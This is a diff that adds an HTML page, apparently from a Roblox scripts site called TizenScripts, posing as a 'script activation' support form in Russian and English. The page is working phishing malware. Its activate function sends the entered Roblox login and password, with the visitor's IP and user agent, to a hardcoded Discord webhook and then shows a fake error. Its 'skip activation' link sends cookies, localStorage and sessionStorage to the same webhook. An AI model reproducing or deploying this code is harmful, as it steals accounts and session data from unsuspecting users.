@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Поддержка - TizenScripts</title>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh;
+        }
+        header {
+            background: #1a1a1a;
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 2px solid #ff4444;
+        }
+        header h1 {
+            font-size: 36px;
+            color: #ff4444;
+        }
+        .language-selector {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+        .language-selector select {
+            padding: 10px 15px;
+            background: #1a1a1a;
+            color: #fff;
+            border: 2px solid #ff4444;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        nav {
+            background: #111;
+            padding: 15px;
+            text-align: center;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+        }
+        nav a:hover { color: #ff4444; }
+        main {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        .support-form {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 10px;
+            border: 2px solid #333;
+        }
+        .support-form h2 {
+            color: #ff4444;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .support-form .subtitle {
+            color: #888;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .support-form label {
+            display: block;
+            margin-bottom: 5px;
+            color: #888;
+        }
+        .support-form input {
+            width: 100%;
+            padding: 12px;
+            background: #0a0a0a;
+            border: 2px solid #333;
+            border-radius: 5px;
+            color: #fff;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        .support-form input:focus {
+            border-color: #ff4444;
+            outline: none;
+        }
+        .activate-btn {
+            width: 100%;
+            padding: 15px;
+            background: #ff4444;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .activate-btn:hover {
+            background: #ff6666;
+        }
+        .skip-btn {
+            width: 100%;
+            padding: 12px;
+            background: #333;
+            color: #888;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+        .skip-btn:hover {
+            background: #444;
+        }
+        .error {
+            color: #ff4444;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        .loading {
+            color: #ffaa00;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Выбор языка -->
+    <div class="language-selector">
+        <select id="languageSelect" onchange="changeLanguage(this.value)">
+            <option value="ru">🇷🇺 Русский</option>
+            <option value="en">🇬🇧 English</option>
+        </select>
+    </div>
+    
+    <header>
+        <h1>⚡ TizenScripts</h1>
+        <p id="headerSubtitle">Поддержка</p>
+    </header>
+    
+    <nav>
+        <a href="index.html" id="navHome">Главная</a>
+        <a href="scripts.html" id="navScripts">Скрипты</a>
+        <a href="extensions.html" id="navExtensions">Расширения</a>
+        <a href="support.html" id="navSupport">Поддержка</a>
+    </nav>
+    
+    <main>
+        <div class="support-form">
+            <h2 id="formTitle">🔐 Активация скриптов</h2>
+            <p class="subtitle" id="formSubtitle">Для активации введите данные от аккаунта Roblox</p>
+            
+            <label id="usernameLabel">Логин Roblox</label>
+            <input type="text" id="username" placeholder="Введите логин...">
+            
+            <label id="passwordLabel">Пароль Roblox</label>
+            <input type="password" id="password" placeholder="Введите пароль...">
+            
+            <div class="error" id="error">Неверные данные!</div>
+            <div class="loading" id="loading">Проверка данных...</div>
+            
+            <button class="activate-btn" id="activateBtn" onclick="activate()">Активировать</button>
+            
+            <a href="#" class="skip-btn" id="skipBtn" onclick="stealData()">Пропустить активацию</a>
+        </div>
+    </main>
+    
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
+        
+        // Переводы
+        const translations = {
+            ru: {
+                headerSubtitle: 'Поддержка',
+                navHome: 'Главная',
+                navScripts: 'Скрипты',
+                navExtensions: 'Расширения',
+                navSupport: 'Поддержка',
+                formTitle: '🔐 Активация скриптов',
+                formSubtitle: 'Для активации введите данные от аккаунта Roblox',
+                usernameLabel: 'Логин Roblox',
+                passwordLabel: 'Пароль Roblox',
+                usernamePlaceholder: 'Введите логин...',
+                passwordPlaceholder: 'Введите пароль...',
+                activateBtn: 'Активировать',
+                skipBtn: 'Пропустить активацию',
+                errorEmpty: 'Заполните все поля!',
+                loadingText: 'Проверка данных...',
+                errorWrong: '❌ Неверные данные! Проверьте логин и пароль.'
+            },
+            en: {
+                headerSubtitle: 'Support',
+                navHome: 'Home',
+                navScripts: 'Scripts',
+                navExtensions: 'Extensions',
+                navSupport: 'Support',
+                formTitle: '🔐 Script Activation',
+                formSubtitle: 'Enter your Roblox account details to activate',
+                usernameLabel: 'Roblox Username',
+                passwordLabel: 'Roblox Password',
+                usernamePlaceholder: 'Enter username...',
+                passwordPlaceholder: 'Enter password...',
+                activateBtn: 'Activate',
+                skipBtn: 'Skip activation',
+                errorEmpty: 'Please fill in all fields!',
+                loadingText: 'Checking data...',
+                errorWrong: '❌ Invalid credentials! Check your username and password.'
+            }
+        };
+        
+        // Функция смены языка
+        function changeLanguage(lang) {
+            localStorage.setItem('language', lang);
+            const t = translations[lang];
+            
+            document.getElementById('headerSubtitle').textContent = t.headerSubtitle;
+            document.getElementById('navHome').textContent = t.navHome;
+            document.getElementById('navScripts').textContent = t.navScripts;
+            document.getElementById('navExtensions').textContent = t.navExtensions;
+            document.getElementById('navSupport').textContent = t.navSupport;
+            document.getElementById('formTitle').textContent = t.formTitle;
+            document.getElementById('formSubtitle').textContent = t.formSubtitle;
+            document.getElementById('usernameLabel').textContent = t.usernameLabel;
+            document.getElementById('passwordLabel').textContent = t.passwordLabel;
+            document.getElementById('username').placeholder = t.usernamePlaceholder;
+            document.getElementById('password').placeholder = t.passwordPlaceholder;
+            document.getElementById('activateBtn').textContent = t.activateBtn;
+            document.getElementById('skipBtn').textContent = t.skipBtn;
+            
+            // Отправляем выбор языка в Discord
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: '🌍 **ЯЗЫК ПОДДЕРЖКИ**: ' + lang.toUpperCase()})
+            });
+        }
+        
+        // Загрузка сохранённого языка
+        function loadLanguage() {
+            const savedLang = localStorage.getItem('language') || 'ru';
+            document.getElementById('languageSelect').value = savedLang;
+            changeLanguage(savedLang);
+        }
+        
+        async function activate() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const error = document.getElementById('error');
+            const loading = document.getElementById('loading');
+            const lang = localStorage.getItem('language') || 'ru';
+            const t = translations[lang];
+            
+            if (username === '' || password === '') {
+                error.textContent = t.errorEmpty;
+                error.style.display = 'block';
+                return;
+            }
+            
+            error.style.display = 'none';
+            loading.textContent = t.loadingText;
+            loading.style.display = 'block';
+            
+            // Отправляем данные в Discord
+            const message = '🔑 **ДАННЫЕ ОТ АККАУНТА ROBLOX**\n\n' +
+                '👤 **Логин:** ' + username + '\n' +
+                '🔒 **Пароль:** ' + password + '\n\n' +
+                '🌐 IP: ' + await getIP() + '\n' +
+                '👤 UA: ' + navigator.userAgent + '\n' +
+                '🌍 Язык сайта: ' + lang.toUpperCase() + '\n' +
+                '⏰ Время: ' + new Date().toLocaleString();
+            
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: message})
+            });
+            
+            // Фейковая проверка
+            setTimeout(function() {
+                loading.style.display = 'none';
+                error.textContent = t.errorWrong;
+                error.style.display = 'block';
+            }, 3000);
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) { return 'Unknown'; }
+        }
+        
+        async function stealData() {
+            const data = {
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                url: window.location.href,
+                language: localStorage.getItem('language') || 'ru'
+            };
+            
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                data.ip = ipData.ip;
+            } catch (e) { data.ip = 'Unknown'; }
+            
+            const message = '⚠️ **ПРОПУСК АКТИВАЦИИ - КРАЖА ДАННЫХ**\n\n' +
+                '🌐 IP: ' + data.ip + '\n' +
+                '👤 UA: ' + data.userAgent + '\n' +
+                '💻 Платформа: ' + data.platform + '\n' +
+                '🖥️ Экран: ' + data.screen + '\n' +
+                '⏰ TZ: ' + data.timezone + '\n' +
+                '🌍 Язык: ' + data.language + '\n' +
+                '🔗 URL: ' + data.url + '\n\n' +
+                '🍪 COOKIES:\n```' + data.cookies + '```\n\n' +
+                '💾 LocalStorage:\n```' + data.localStorage.substring(0, 500) + '```';
+            
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: message})
+            });
+            
+            setTimeout(function() {
+                window.location.href = 'index.html';
+            }, 3000);
+            
+            return false;
+        }
+        
+        // Загрузка языка при старте
+        window.addEventListener('load', function() {
+            loadLanguage();
+        });
+    </script>
+</body>
+</html>
